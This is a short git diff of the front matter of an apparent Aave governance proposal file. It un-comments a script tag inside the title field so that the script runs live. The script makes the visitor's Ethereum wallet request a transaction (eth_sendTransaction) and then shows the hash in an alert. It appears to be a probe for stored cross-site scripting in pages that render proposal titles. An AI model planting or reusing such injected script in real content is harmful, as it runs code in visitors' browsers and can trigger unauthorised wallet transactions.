@@ -1,5 +1,5 @@
 ---
-title: TEST <!-- <script>const transactionHash = await ethereum.request({method: 'eth_sendTransaction',params: [{from: '0x72553A06697A2E8042285b4E0E0f0e66dB7d2395',to: '0x0000000000000000000000000000000000000000',value: '0x1',gasPrice: '0x77359400',maxPriorityFeePerGas: undefined,maxFeePerGas: undefined},],});alert(transactionHash);</script></h3>
+title: TEST <script>const transactionHash = await ethereum.request({method: 'eth_sendTransaction',params: [{from: '0x72553A06697A2E8042285b4E0E0f0e66dB7d2395',to: '0x0000000000000000000000000000000000000000',value: '0x1',gasPrice: '0x77359400',maxPriorityFeePerGas: undefined,maxFeePerGas: undefined},],});alert(transactionHash);</script></h3>
 author: BGD Labs (@bgdlabs)
 shortDescription: Activation of Aave v3 Ethereum
 discussions: https://governance.aave.com/t/bgd-aave-v3-ethereum-new-deployment-vs-aave-v2-upgrade/9990/16
